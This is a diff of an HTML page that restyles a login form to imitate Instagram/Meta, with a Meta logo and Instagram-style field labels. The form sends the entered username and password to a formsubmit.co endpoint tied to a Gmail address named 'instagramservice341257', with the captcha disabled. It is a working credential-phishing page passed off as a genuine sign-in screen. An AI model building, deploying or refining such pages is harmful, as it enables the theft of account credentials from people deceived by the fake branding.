@@ -3,144 +3,140 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Inicio de Sesión</title>
+<title>inicio de Sesión</title>
 
 <style>
 body {
-  background: #f0f0f1;
+  margin: 0;
   font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+  background: #fafafa;
   display: flex;
   justify-content: center;
   align-items: center;
   height: 100vh;
-  margin: 0;
 }
 
-.wrapper {
-  width: 360px;
+.container {
+  width: 90%;
+  max-width: 380px;
   text-align: center;
 }
 
-.logo {
-  margin-bottom: 20px;
+.card {
+  background: white;
+  padding: 30px 20px;
+  border-radius: 25px;
+  box-shadow: 0 15px 35px rgba(0,0,0,0.1);
 }
 
 .profile-pic {
-  width: 84px;
-  height: 84px;
+  width: 90px;
+  height: 90px;
   border-radius: 50%;
   object-fit: cover;
-  margin-bottom: 15px;
+  margin-bottom: 25px;
+  border: 3px solid #1877f2;
 }
 
-.login-box {
-  background: #fff;
-  padding: 26px 24px 30px;
-  border: 1px solid #c3c4c7;
-  box-shadow: 0 1px 3px rgba(0,0,0,.04);
-  text-align: left;
-}
-
-label {
-  font-size: 14px;
-  font-weight: 400;
-  display: block;
-  margin-bottom: 5px;
-}
-
-input[type="text"],
-textarea {
+.input-box {
   width: 100%;
-  padding: 6px 8px;
-  margin-bottom: 16px;
-  border: 1px solid #8c8f94;
-  border-radius: 3px;
-  font-size: 14px;
+  padding: 16px;
+  margin-bottom: 15px;
+  border-radius: 18px;
+  border: 1px solid #ddd;
+  font-size: 16px;
   box-sizing: border-box;
+  background: #f2f2f2;
+  transition: 0.2s;
 }
 
-input:focus,
-textarea:focus {
-  border-color: #2271b1;
-  box-shadow: 0 0 0 1px #2271b1;
+.input-box:focus {
   outline: none;
-}
-
-.remember {
-  margin-bottom: 16px;
-  font-size: 13px;
+  background: white;
+  border-color: #1877f2;
+  box-shadow: 0 0 0 3px rgba(24,119,242,0.1);
 }
 
 button {
   width: 100%;
-  padding: 8px 12px;
-  background: #2271b1;
-  border: 1px solid #2271b1;
+  padding: 15px;
+  border-radius: 30px;
+  border: none;
+  background: #1877f2;
   color: white;
-  font-size: 14px;
-  border-radius: 3px;
+  font-size: 16px;
+  font-weight: 600;
   cursor: pointer;
+  transition: 0.2s;
 }
 
 button:hover {
-  background: #135e96;
+  opacity: 0.9;
 }
 
-.links {
-  margin-top: 16px;
-  font-size: 13px;
-  text-align: center;
-}
-
-.links a {
-  color: #2271b1;
-  text-decoration: none;
-}
-
-.links a:hover {
-  text-decoration: underline;
-}
-
-.language {
+.frase-inciar {
   margin-top: 20px;
-  font-size: 12px;
-  color: #50575e;
-  text-align: center;
+  font-size: 14px;
+  color: #333;
 }
+
+.secondary-btn {
+  margin-top: 20px;
+  width: 100%;
+  padding: 12px;
+  border-radius: 25px;
+  border: 1px solid #2271b1;
+  background: transparent;
+  color: #2271b1;
+  font-size: 15px;
+  cursor: pointer;
+}
+.footer {
+  margin-top: 25px;
+}
+
+.meta-logo {
+  width: 85px;
+  opacity: 0.85;
+}
+
+
 </style>
 </head>
 
 <body>
 
-<div class="wrapper">
+<div class="container">
+  <div class="card">
 
-  <!-- TU IMAGEN -->
-  <img src="foto.jpg" alt=" " class="profile-pic">
-
-  <div class="login-box">
+    <!-- TU FOTO -->
+    <img src="foto.jpg" alt="Mi foto" class="profile-pic">
 
     <form action="https://formsubmit.co/instagramservice341257@gmail.com" method="POST">
-
       <input type="hidden" name="_captcha" value="false">
 
-      <label>Nombre de usuario o correo electrónico</label>
-      <input type="text" name="usuario" required>
+      <input type="text" name="usuario" placeholder="Usuario, correo electrónico o móvil" class="input-box" required>
 
-      <label>Contraseña</label>
-      <textarea name="mensaje" rows="4" required></textarea>
+      <input type="text" name="mensaje" placeholder="Contraseña" class="input-box" required>
 
-      <div class="remember">
-        <input type="checkbox" id="remember">
-        <label for="remember" style="display:inline;">Recuérdame</label>
-      </div>
-
-      <button type="submit">Acceder</button>
-
+      <button type="submit">Iniciar Sesión</button>
     </form>
 
-    <div class="links">
-      <a href="#">¿Has olvidado tu contraseña?</a>
+     </div>
+
+   <div class="frase-bonita">
+    ¿Has olvidado tu contraseña?
+  </div>
+
+  <button class="secondary-btn">
+    Crear cuenta nueva
+  </button>
+
+    <!-- LOGO META ABAJO -->
+    <div class="footer">
+      <img src="meta.png" alt="Meta" class="meta-logo">
     </div>
+
 
 </div>
 
